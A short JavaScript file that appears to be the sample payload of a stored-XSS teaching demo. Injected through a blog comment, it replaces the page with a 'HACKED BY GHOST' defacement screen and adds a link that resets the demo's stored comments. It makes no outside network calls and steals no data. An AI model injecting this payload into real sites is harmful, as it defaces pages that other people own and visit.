/* The "attacker's" payload. A comment that loads this script defaces the
   whole page for everyone who opens the blog -- that's stored XSS. */
(function () {
  document.title = "pwned";
  var st = document.createElement("style");
  st.textContent =
    "@keyframes flk{0%,18%,22%,100%{opacity:1}20%{opacity:.2}}" +
    "@keyframes gli{0%{transform:translate(0,0)}25%{transform:translate(-4px,1px)}" +
    "50%{transform:translate(3px,-2px)}75%{transform:translate(-2px,1px)}100%{transform:translate(0,0)}}" +
    "@keyframes sc{from{background-position:0 0}to{background-position:0 100vh}}";
  document.head.appendChild(st);
  document.body.style.margin = "0";
  document.body.innerHTML =
    '<div style="position:fixed;inset:0;background:#050208;color:#ff0033;display:flex;' +
    'flex-direction:column;align-items:center;justify-content:center;' +
    'font-family:ui-monospace,Menlo,Consolas,monospace;text-align:center;z-index:99999;overflow:hidden">' +
    '<div style="position:absolute;inset:0;background:repeating-linear-gradient(transparent 0 2px,' +
    'rgba(255,0,51,.06) 2px 4px);animation:sc 6s linear infinite;pointer-events:none"></div>' +
    '<div style="font-size:130px;line-height:1;animation:flk 2.2s infinite">&#128128;</div>' +
    '<div style="font-size:62px;font-weight:bold;letter-spacing:8px;text-shadow:0 0 26px #ff0033;' +
    'animation:gli .35s infinite">HACKED BY GHOST</div>' +
    '<div style="font-size:23px;opacity:.85;margin-top:12px;letter-spacing:2px">THIS SITE HAS BEEN SEIZED</div>' +
    '<a href="#" onclick="localStorage.removeItem(\'ith_comments\');location.href=\'blog.html\';return false" ' +
    'style="margin-top:34px;display:inline-block;background:#ff0033;color:#050208;font-weight:700;' +
    'font-size:18px;padding:13px 26px;border-radius:10px;text-decoration:none;font-family:Arial,sans-serif;' +
    'letter-spacing:1px;position:relative;z-index:1">&#8635; Reset the blog</a>' +
    "</div>";
})();
